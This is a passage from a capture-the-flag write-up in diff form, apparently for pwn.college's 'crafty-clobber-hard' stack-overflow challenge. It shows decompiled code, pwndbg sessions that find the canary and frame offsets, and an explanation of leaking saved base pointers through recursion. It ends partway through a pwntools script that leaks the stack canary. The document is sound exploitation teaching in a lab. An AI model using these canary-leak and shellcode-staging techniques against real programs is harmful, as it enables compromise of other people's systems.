@@ -12069,6 +12069,8 @@ hacker@program-security~a-crafty-clobber-hard:~$ checksec /challenge/crafty-clob
 - [ ] Expected value for `challenge()` to not `exit()`
 - [ ] Location of expected value for `challenge()` to not `exit()`
 
+### Binary Analysis
+
 ```
 pwndbg> info functions
 All defined functions:
@@ -12086,4 +12088,656 @@ Non-debugging symbols:
 0x0000000000001170  exit@plt
 0x0000000000001180  strerror@plt
 0x0000000000001190  strstr@plt
+```
+
+No functions, same as the last hard challenge. Let's use IDA.
+
+#### `main()`
+
+```c showLineNumbers
+__int64 __fastcall main(unsigned int a1, char **binary_name, char **a3)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *binary_name);
+  puts("###");
+  putchar(10);
+  challenge(a1, binary_name, a3);
+  puts("### Goodbye!");
+  return 0LL;
+}
+```
+
+We can see that the `main()` function calls `challenge()`.
+
+```c showLineNumbers
+__int64 __fastcall challenge(unsigned int a1, __int64 binary_name, __int64 a3)
+{
+  int *v3; // rax
+  char *error_reason; // rax
+  size_t payload_size; // [rsp+30h] [rbp-60h] BYREF
+  void *buf; // [rsp+38h] [rbp-58h]
+  __int64 v9[8]; // [rsp+40h] [rbp-50h] BYREF
+  __int64 v10; // [rsp+80h] [rbp-10h]
+  unsigned __int64 v11; // [rsp+88h] [rbp-8h]
+
+  v11 = __readfsqword(0x28u);
+  memset(v9, 0, sizeof(v9));
+  v10 = 0LL;
+  buf = v9;
+  payload_size = 0LL;
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &payload_size);
+  printf("Send your payload (up to %lu bytes)!\n", payload_size);
+  if ( (int)read(0, buf, payload_size) < 0 )
+  {
+    v3 = __errno_location();
+    error_reason = strerror(*v3);
+    printf("ERROR: Failed to read input -- %s!\n", error_reason);
+    exit(1);
+  }
+  printf("You said: %s\n", (const char *)buf);
+  if ( strstr((const char *)buf, "REPEAT") )
+  {
+    puts("Backdoor triggered! Repeating challenge()");
+    return challenge(a1, binary_name, a3);
+  }
+  else
+  {
+    puts("Goodbye!");
+    if ( v10 != 0x3AF9ACCA4293A671LL )
+    {
+      puts("exit() condition triggered. Exiting!");
+      exit(42);
+    }
+    puts("exit() condition avoided! Continuing execution.");
+    return 0LL;
+  }
+}
+```
+
+- [ ] Location of the buffer
+- [ ] Location of the canary 
+- [ ] Location of stored return address to `main()` 
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function 
+   - [ ] Location of buffer for `n` th frame 
+   - [ ] Location of buffer for `n+1`th frame 
+- [x] Expected substring in order to loop the `challenge()` function : `REPEAT`
+- [x] Expected value for `challenge()` to not `exit()`: `0x3AF9ACCA4293A671`
+- [x] Location of expected value for `challenge()` to not `exit()`: Right before the canary
+
+In order to find the rest, we will have to use GDB. Let's begin by setting a breakpoint at `read@plt` calls.
+
+```
+pwndbg> break read@plt
+Breakpoint 1 at 0x1140
+```
+
+```
+pwndbg> run
+Starting program: /challenge/crafty-clobber-hard 
+###
+### Welcome to /challenge/crafty-clobber-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x0000579c4cd7c140 in read@plt ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fffc7df0f70 ◂— 0
+ RBX  0x579c4cd7cb30 ◂— endbr64 
+ RCX  0
+ RDX  2
+ RDI  0
+ RSI  0x7fffc7df0f70 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x579c4cd7d03c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x579c4cd7c1a0 ◂— endbr64 
+ R13  0x7fffc7df20f0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fffc7df0fc0 —▸ 0x7fffc7df2000 ◂— 0
+ RSP  0x7fffc7df0f28 —▸ 0x579c4cd7c93e ◂— mov dword ptr [rbp - 0x64], eax
+ RIP  0x579c4cd7c140 (read@plt) ◂— endbr64 
+────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x579c4cd7c140 <read@plt>      endbr64 
+   0x579c4cd7c144 <read@plt+4>    bnd jmp qword ptr [rip + 0x2e5d]   <read>
+    ↓
+   0x7ad6106661e0 <read>          endbr64 
+   0x7ad6106661e4 <read+4>        mov    eax, dword ptr fs:[0x18]     EAX, [0x7ad61074b558] => 0
+   0x7ad6106661ec <read+12>       test   eax, eax                     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x7ad6106661ee <read+14>     ✘ jne    read+32                     <read+32>
+ 
+   0x7ad6106661f0 <read+16>       syscall  <SYS_read>
+   0x7ad6106661f2 <read+18>       cmp    rax, -0x1000
+   0x7ad6106661f8 <read+24>       ja     read+112                    <read+112>
+ 
+   0x7ad6106661fa <read+26>       ret    
+ 
+   0x7ad6106661fb <read+27>       nop    dword ptr [rax + rax]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffc7df0f28 —▸ 0x579c4cd7c93e ◂— mov dword ptr [rbp - 0x64], eax
+01:0008│-090 0x7fffc7df0f30 ◂— 0xd68 /* 'h\r' */
+02:0010│-088 0x7fffc7df0f38 —▸ 0x7fffc7df2108 —▸ 0x7fffc7df2689 ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-080 0x7fffc7df0f40 —▸ 0x7fffc7df20f8 —▸ 0x7fffc7df266a ◂— '/challenge/crafty-clobber-hard'
+04:0020│-078 0x7fffc7df0f48 ◂— 0x10000000a /* '\n' */
+05:0028│-070 0x7fffc7df0f50 —▸ 0x7ad6107456a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+06:0030│-068 0x7fffc7df0f58 —▸ 0x579c4cd7f010 (stdout) —▸ 0x7ad6107456a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-060 0x7fffc7df0f60 ◂— 2
+───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x579c4cd7c140 read@plt
+   1   0x579c4cd7c93e None
+   2   0x579c4cd7cafa None
+   3   0x7ad61057c083 __libc_start_main+243
+   4   0x579c4cd7c1ce None
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the buffer: `0x7fffc7df0f70`
+- [ ] Location of the canary 
+- [ ] Location of stored return address to `main()` 
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function 
+   - [ ] Location of buffer for `n` th frame 
+   - [ ] Location of buffer for `n+1`th frame 
+- [x] Expected substring in order to loop the `challenge()` function : `REPEAT`
+- [x] Expected value for `challenge()` to not `exit()`: `0x3AF9ACCA4293A671`
+- [x] Location of expected value for `challenge()` to not `exit()`: Right before the canary
+
+Our program is currently in the `read@plt` resolution, as shown by the `BACKTRACE` section. Let's finish this function and return back to `challenge()`.
+
+```
+pwndbg> fini
+Run till exit from #0  0x0000579c4cd7c140 in read@plt ()
+
+0x0000579c4cd7c93e in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
+*RAX  1
+ RBX  0x579c4cd7cb30 ◂— endbr64 
+*RCX  0x7ad6106661f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  2
+ RDI  0
+ RSI  0x7fffc7df0f70 ◂— 0xa /* '\n' */
+ R8   0x23
+ R9   0x23
+ R10  0x579c4cd7d03c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x579c4cd7c1a0 ◂— endbr64 
+ R13  0x7fffc7df20f0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fffc7df0fc0 —▸ 0x7fffc7df2000 ◂— 0
+*RSP  0x7fffc7df0f30 ◂— 0xd68 /* 'h\r' */
+*RIP  0x579c4cd7c93e ◂— mov dword ptr [rbp - 0x64], eax
+────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x579c4cd7c93e    mov    dword ptr [rbp - 0x64], eax     [0x7fffc7df0f5c] <= 1
+   0x579c4cd7c941    cmp    dword ptr [rbp - 0x64], 0       1 - 0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
+   0x579c4cd7c945  ✔ jns    0x579c4cd7c973              <0x579c4cd7c973>
+    ↓
+   0x579c4cd7c973    mov    rax, qword ptr [rbp - 0x58]     RAX, [0x7fffc7df0f68] => 0x7fffc7df0f70 ◂— 0xa
+   0x579c4cd7c977    mov    rsi, rax                        RSI => 0x7fffc7df0f70 ◂— 0xa
+   0x579c4cd7c97a    lea    rdi, [rip + 0x6eb]              RDI => 0x579c4cd7d06c ◂— 'You said: %s\n'
+   0x579c4cd7c981    mov    eax, 0                          EAX => 0
+   0x579c4cd7c986    call   printf@plt                  <printf@plt>
+ 
+   0x579c4cd7c98b    mov    rax, qword ptr [rbp - 0x58]
+   0x579c4cd7c98f    lea    rsi, [rip + 0x6e4]              RSI => 0x579c4cd7d07a ◂— 0x544145504552 /* 'REPEAT' */
+   0x579c4cd7c996    mov    rdi, rax
+─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffc7df0f30 ◂— 0xd68 /* 'h\r' */
+01:0008│-088 0x7fffc7df0f38 —▸ 0x7fffc7df2108 —▸ 0x7fffc7df2689 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-080 0x7fffc7df0f40 —▸ 0x7fffc7df20f8 —▸ 0x7fffc7df266a ◂— '/challenge/crafty-clobber-hard'
+03:0018│-078 0x7fffc7df0f48 ◂— 0x10000000a /* '\n' */
+04:0020│-070 0x7fffc7df0f50 —▸ 0x7ad6107456a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-068 0x7fffc7df0f58 —▸ 0x579c4cd7f010 (stdout) —▸ 0x7ad6107456a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+06:0030│-060 0x7fffc7df0f60 ◂— 2
+07:0038│-058 0x7fffc7df0f68 —▸ 0x7fffc7df0f70 ◂— 0xa /* '\n' */
+───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x579c4cd7c93e None
+   1   0x579c4cd7cafa None
+   2   0x7ad61057c083 __libc_start_main+243
+   3   0x579c4cd7c1ce None
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+We can now get the of the stored return address and the canary in order to calculate the offsets.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7fffc7df0fd0:
+ rip = 0x579c4cd7c93e; saved rip = 0x579c4cd7cafa
+ called by frame at 0x7fffc7df2010
+ Arglist at 0x7fffc7df0f28, args: 
+ Locals at 0x7fffc7df0f28, Previous frame's sp is 0x7fffc7df0fd0
+ Saved registers:
+  rbp at 0x7fffc7df0fc0, rip at 0x7fffc7df0fc8
+```
+
+```
+pwndbg> x/15gx $rsi
+0x7fffc7df0f70: 0x000000000000000a      0x0000000000000000
+0x7fffc7df0f80: 0x0000000000000000      0x0000000000000000
+0x7fffc7df0f90: 0x0000000000000000      0x0000000000000000
+0x7fffc7df0fa0: 0x0000000000000000      0x0000000000000000
+0x7fffc7df0fb0: 0x0000000000000000      0xea5aa13446ebea00
+0x7fffc7df0fc0: 0x00007fffc7df2000      0x0000579c4cd7cafa
+0x7fffc7df0fd0: 0x0000000000001000      0x00007fffc7df2108
+0x7fffc7df0fe0: 0x00007fffc7df20f8
+```
+
+We can tell that the canary for this frame is at `0x7fffc7df0fb8`. We know this because it is 16 bytes before our stored return address, and also because of the `\x00` byte.
+
+- [x] Location of the buffer: `0x7fffc7df0f70`
+- [x] Location of the canary: `0x7fffc7df0fb8`
+- [x] Location of stored return address to `main()`: `0x7fffc7df0fc8`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function 
+   - [ ] Location of buffer for `n` th frame 
+   - [ ] Location of buffer for `n+1`th frame 
+- [x] Expected substring in order to loop the `challenge()` function : `REPEAT`
+- [x] Expected value for `challenge()` to not `exit()`: `0x3AF9ACCA4293A671`
+- [x] Location of expected value for `challenge()` to not `exit()`: Right before the canary
+
+Let's run the program again, and pass `REPEAT` as the payload so that the `challenge()` is called again, and we get the `n+1`th frame.
+
+```
+pwndbg> run
+Starting program: /challenge/crafty-clobber-hard 
+###
+### Welcome to /challenge/crafty-clobber-hard!
+###
+
+Payload size: 6
+Send your payload (up to 6 bytes)!
+
+Breakpoint 1, 0x00005e9a4825f140 in read@plt ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffcb1f7fd00 ◂— 0
+ RBX  0x5e9a4825fb30 ◂— endbr64 
+ RCX  0
+ RDX  6
+ RDI  0
+ RSI  0x7ffcb1f7fd00 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x5e9a4826003c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5e9a4825f1a0 ◂— endbr64 
+ R13  0x7ffcb1f80e80 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffcb1f7fd50 —▸ 0x7ffcb1f80d90 ◂— 0
+ RSP  0x7ffcb1f7fcb8 —▸ 0x5e9a4825f93e ◂— mov dword ptr [rbp - 0x64], eax
+ RIP  0x5e9a4825f140 (read@plt) ◂— endbr64 
+────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5e9a4825f140 <read@plt>      endbr64 
+   0x5e9a4825f144 <read@plt+4>    bnd jmp qword ptr [rip + 0x2e5d]   <read>
+    ↓
+   0x7c458538f1e0 <read>          endbr64 
+   0x7c458538f1e4 <read+4>        mov    eax, dword ptr fs:[0x18]     EAX, [0x7c4585474558] => 0
+   0x7c458538f1ec <read+12>       test   eax, eax                     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x7c458538f1ee <read+14>     ✘ jne    read+32                     <read+32>
+ 
+   0x7c458538f1f0 <read+16>       syscall  <SYS_read>
+   0x7c458538f1f2 <read+18>       cmp    rax, -0x1000
+   0x7c458538f1f8 <read+24>       ja     read+112                    <read+112>
+ 
+   0x7c458538f1fa <read+26>       ret    
+ 
+   0x7c458538f1fb <read+27>       nop    dword ptr [rax + rax]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcb1f7fcb8 —▸ 0x5e9a4825f93e ◂— mov dword ptr [rbp - 0x64], eax
+01:0008│-090 0x7ffcb1f7fcc0 ◂— 0xd68 /* 'h\r' */
+02:0010│-088 0x7ffcb1f7fcc8 —▸ 0x7ffcb1f80e98 —▸ 0x7ffcb1f82689 ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-080 0x7ffcb1f7fcd0 —▸ 0x7ffcb1f80e88 —▸ 0x7ffcb1f8266a ◂— '/challenge/crafty-clobber-hard'
+04:0020│-078 0x7ffcb1f7fcd8 ◂— 0x10000000a /* '\n' */
+05:0028│-070 0x7ffcb1f7fce0 —▸ 0x7c458546e6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+06:0030│-068 0x7ffcb1f7fce8 —▸ 0x5e9a48262010 (stdout) —▸ 0x7c458546e6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-060 0x7ffcb1f7fcf0 ◂— 6
+───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5e9a4825f140 read@plt
+   1   0x5e9a4825f93e None
+   2   0x5e9a4825fafa None
+   3   0x7c45852a5083 __libc_start_main+243
+   4   0x5e9a4825f1ce None
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the buffer: `0x7fffc7df0f70`
+- [x] Location of the canary: `0x7fffc7df0fb8`
+- [x] Location of stored return address to `main()`: `0x7fffc7df0fc8`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function 
+   - [X] Location of buffer for `n` th frame: `0x7ffcb1f7fd00`
+   - [ ] Location of buffer for `n+1`th frame 
+- [x] Expected substring in order to loop the `challenge()` function : `REPEAT`
+- [x] Expected value for `challenge()` to not `exit()`: `0x3AF9ACCA4293A671`
+- [x] Location of expected value for `challenge()` to not `exit()`: Right before the canary
+
+Let's finish out of `read@plt` and pass `REPEAT`.
+
+```
+pwndbg> fini
+Run till exit from #0  0x00005e9a4825f140 in read@plt ()
+REPEAT
+0x00005e9a4825f93e in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
+*RAX  6
+ RBX  0x5e9a4825fb30 ◂— endbr64 
+*RCX  0x7c458538f1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  6
+ RDI  0
+ RSI  0x7ffcb1f7fd00 ◂— 0x544145504552 /* 'REPEAT' */
+ R8   0x23
+ R9   0x23
+ R10  0x5e9a4826003c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5e9a4825f1a0 ◂— endbr64 
+ R13  0x7ffcb1f80e80 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffcb1f7fd50 —▸ 0x7ffcb1f80d90 ◂— 0
+*RSP  0x7ffcb1f7fcc0 ◂— 0xd68 /* 'h\r' */
+*RIP  0x5e9a4825f93e ◂— mov dword ptr [rbp - 0x64], eax
+────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5e9a4825f93e    mov    dword ptr [rbp - 0x64], eax     [0x7ffcb1f7fcec] <= 6
+   0x5e9a4825f941    cmp    dword ptr [rbp - 0x64], 0       6 - 0     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
+   0x5e9a4825f945  ✔ jns    0x5e9a4825f973              <0x5e9a4825f973>
+    ↓
+   0x5e9a4825f973    mov    rax, qword ptr [rbp - 0x58]     RAX, [0x7ffcb1f7fcf8] => 0x7ffcb1f7fd00 ◂— 0x544145504552 /* 'REPEAT' */
+   0x5e9a4825f977    mov    rsi, rax                        RSI => 0x7ffcb1f7fd00 ◂— 0x544145504552 /* 'REPEAT' */
+   0x5e9a4825f97a    lea    rdi, [rip + 0x6eb]              RDI => 0x5e9a4826006c ◂— 'You said: %s\n'
+   0x5e9a4825f981    mov    eax, 0                          EAX => 0
+   0x5e9a4825f986    call   printf@plt                  <printf@plt>
+ 
+   0x5e9a4825f98b    mov    rax, qword ptr [rbp - 0x58]
+   0x5e9a4825f98f    lea    rsi, [rip + 0x6e4]              RSI => 0x5e9a4826007a ◂— 0x544145504552 /* 'REPEAT' */
+   0x5e9a4825f996    mov    rdi, rax
+─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcb1f7fcc0 ◂— 0xd68 /* 'h\r' */
+01:0008│-088 0x7ffcb1f7fcc8 —▸ 0x7ffcb1f80e98 —▸ 0x7ffcb1f82689 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-080 0x7ffcb1f7fcd0 —▸ 0x7ffcb1f80e88 —▸ 0x7ffcb1f8266a ◂— '/challenge/crafty-clobber-hard'
+03:0018│-078 0x7ffcb1f7fcd8 ◂— 0x10000000a /* '\n' */
+04:0020│-070 0x7ffcb1f7fce0 —▸ 0x7c458546e6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-068 0x7ffcb1f7fce8 —▸ 0x5e9a48262010 (stdout) —▸ 0x7c458546e6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+06:0030│-060 0x7ffcb1f7fcf0 ◂— 6
+07:0038│-058 0x7ffcb1f7fcf8 —▸ 0x7ffcb1f7fd00 ◂— 0x544145504552 /* 'REPEAT' */
+───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5e9a4825f93e None
+   1   0x5e9a4825fafa None
+   2   0x7c45852a5083 __libc_start_main+243
+   3   0x5e9a4825f1ce None
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> 
+Run till exit from #0  0x00005e9a4825f93e in ?? ()
+You said: REPEAT
+Backdoor triggered! Repeating challenge()
+Payload size:
+```
+
+Enter the payload size for this invocation.
+
+```
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x00005e9a4825f140 in read@plt ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
+*RAX  0x7ffcb1f7fc60 ◂— 0
+ RBX  0x5e9a4825fb30 ◂— endbr64 
+*RCX  0
+*RDX  2
+ RDI  0
+*RSI  0x7ffcb1f7fc60 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x5e9a4826003c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5e9a4825f1a0 ◂— endbr64 
+ R13  0x7ffcb1f80e80 ◂— 1
+ R14  0
+ R15  0
+*RBP  0x7ffcb1f7fcb0 —▸ 0x7ffcb1f7fd50 —▸ 0x7ffcb1f80d90 ◂— 0
+*RSP  0x7ffcb1f7fc18 —▸ 0x5e9a4825f93e ◂— mov dword ptr [rbp - 0x64], eax
+*RIP  0x5e9a4825f140 (read@plt) ◂— endbr64 
+────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5e9a4825f140 <read@plt>      endbr64 
+   0x5e9a4825f144 <read@plt+4>    bnd jmp qword ptr [rip + 0x2e5d]   <read>
+    ↓
+   0x7c458538f1e0 <read>          endbr64 
+   0x7c458538f1e4 <read+4>        mov    eax, dword ptr fs:[0x18]     EAX, [0x7c4585474558] => 0
+   0x7c458538f1ec <read+12>       test   eax, eax                     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x7c458538f1ee <read+14>     ✘ jne    read+32                     <read+32>
+ 
+   0x7c458538f1f0 <read+16>       syscall  <SYS_read>
+   0x7c458538f1f2 <read+18>       cmp    rax, -0x1000
+   0x7c458538f1f8 <read+24>       ja     read+112                    <read+112>
+ 
+   0x7c458538f1fa <read+26>       ret    
+ 
+   0x7c458538f1fb <read+27>       nop    dword ptr [rax + rax]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcb1f7fc18 —▸ 0x5e9a4825f93e ◂— mov dword ptr [rbp - 0x64], eax
+01:0008│-090 0x7ffcb1f7fc20 ◂— 0xd68 /* 'h\r' */
+02:0010│-088 0x7ffcb1f7fc28 —▸ 0x7ffcb1f80e98 —▸ 0x7ffcb1f82689 ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-080 0x7ffcb1f7fc30 —▸ 0x7ffcb1f80e88 —▸ 0x7ffcb1f8266a ◂— '/challenge/crafty-clobber-hard'
+04:0020│-078 0x7ffcb1f7fc38 ◂— 0x10000000a /* '\n' */
+05:0028│-070 0x7ffcb1f7fc40 —▸ 0x7c458546e6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+06:0030│-068 0x7ffcb1f7fc48 —▸ 0x5e9a48260088 ◂— 'Backdoor triggered! Repeating challenge()'
+07:0038│-060 0x7ffcb1f7fc50 ◂— 2
+───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5e9a4825f140 read@plt
+   1   0x5e9a4825f93e None
+   2   0x5e9a4825f9c7 None
+   3   0x5e9a4825fafa None
+   4   0x7c45852a5083 __libc_start_main+243
+   5   0x5e9a4825f1ce None
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg>
+```
+
+The buffer address for the `n+1`th frame is `0x7ffcb1f7fc60`.
+
+- [x] Location of the buffer: `0x7fffc7df0f70`
+- [x] Location of the canary: `0x7fffc7df0fb8`
+- [x] Location of stored return address to `main()`: `0x7fffc7df0fc8`
+- [x] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function: `160`
+   - [X] Location of buffer for `n` th frame: `0x7ffcb1f7fd00`
+   - [x] Location of buffer for `n+1`th frame: `0x7ffcb1f7fc60` 
+- [x] Expected substring in order to loop the `challenge()` function : `REPEAT`
+- [x] Expected value for `challenge()` to not `exit()`: `0x3AF9ACCA4293A671`
+- [x] Location of expected value for `challenge()` to not `exit()`: Right before the canary
+
+
+### Exploit
+
+#### Determining Stack Layout via Frame Pointer Leakage
+
+Given what we know about the stack, we know that the right between the canary and the stored return address, is stored base pointer for the caller function.
+So, when we are in the first invocation of `challenge()`, the stored base pointer has the value of the pointer of `main()`.
+
+Similarly, when we send `REPEAT*` in payload, and the `challenge()` invokes itself again, the stored base pointer of the second invocation points to the stored base pointer of the first invocation of `challenge()`.
+
+```
+<==: Value stored at address
+<--: Points to address
+
+   Address (Hex)           Memory Content                    Description
+                    ┌───────────────────────────┐
+     0x...e4a0      │  [   Shellcode Area    ]  │ <── rsp    Buffer   # 3rd call to challenge()
+         ...        │  .. .. .. .. .. .. .. ..  │
+     0x...e510      │  [    Canary (n=3)     ]  │
+     0x...e518      │  0x...e5d8 (rbp_2)     │  │ <── rbp    Stored RBP (points to n=2)
+     0x...e520      │  [ Return to Frame 2   ]  │            Return Address
+  ────────────────  ├───────────────────────────┤
+     0x...e568      │  .. .. .. .. .. .. .. ..  │ <── rsp    Buffer  # 2nd call to challenge()
+         ...        │  .. .. .. .. .. .. .. ..  │
+     0x...e5d0      │  [    Canary (n=2)     ]  │
+     0x...e5d8      │  0x...e698 (rbp_1)     │  │ <── rbp    Stored RBP (points to n=1)
+     0x...e5e0      │  [ Return to Frame 1   ]  │            Return Address
+  ────────────────  ├───────────────────────────┤
+     0x...e628      │  .. .. .. .. .. .. .. ..  │ <── rsp    Buffer  # 1st call to challenge()
+         ...        │  .. .. .. .. .. .. .. ..  │
+     0x...e690      │  [    Canary (n=1)     ]  │
+     0x...e698      │  0x...e758 (rbp_m)     │  │ <── rbp    Stored RBP (points to main)
+     0x...e6a0      │  [ Return to main()    ]  │            Return Address
+  ────────────────  ├───────────────────────────┤
+     0x...e758      │  [  main's stored RBP  ]  │ <── rbp    Main's Stack Frame
+     0x...e760      │  [ Return to __libc    ]  │
+                    └───────────────────────────┘
+```
+
+When we leak out the canary in the first stage of the payload, we also leak out the store base pointer. However, this is the stored. base pointer of `main()` as we just discussed, and is of no use to us.
+But, if we repeat the first stage of the payload, in the second invocation of `challenge()`, we will be able to leak out the base pointer of the first invocation. 
+
+Since, we know the distance between the buffer and the stored base pointer, we can calculate the address of the first invocation's buffer.
+From there, as we know the offset between the buffers of the `n`th and `n+1`th invocation of `challenge()`, we can calculate the buffer address of the 2nd invocation, and most importantly, calculate the buffer address of the 3rd (next) invocation in which we will pass the shellcode to the challenge.
+
+Having understood this, we can now begin the exploit.
+
+```
+hacker@program-security~a-crafty-clobber-hard:~$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+p = process("/challenge/crafty-clobber-hard")
+
+# Initialize values
+buffer_addr = 0x7fffc7df0f70
+canary_addr = 0x7fffc7df0fb8
+addr_of_saved_ip = 0x7fffc7df0fc8
+nth_buffer_addr = 0x7ffcb1f7fd00
+n_plus_1th_buffer_addr = 0x7ffcb1f7fc60
+no_exit_value = 0x3AF9ACCA4293A671
+offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 160 bytes
+
+# --- STAGE 1: LEAK CANARY ---
+# Calculate offset_to_canary and payload_size
+offset_to_canary = canary_addr - buffer_addr
+payload_size = offset_to_canary + 1
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+# Extract canary
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+print(f"Canary : {hex(canary)}")
+
+
+# --- STAGE 2: LEAK SAVED RBP ---
+# Calculate offset_to_canary and payload_size
+offset_to_rbp = 8
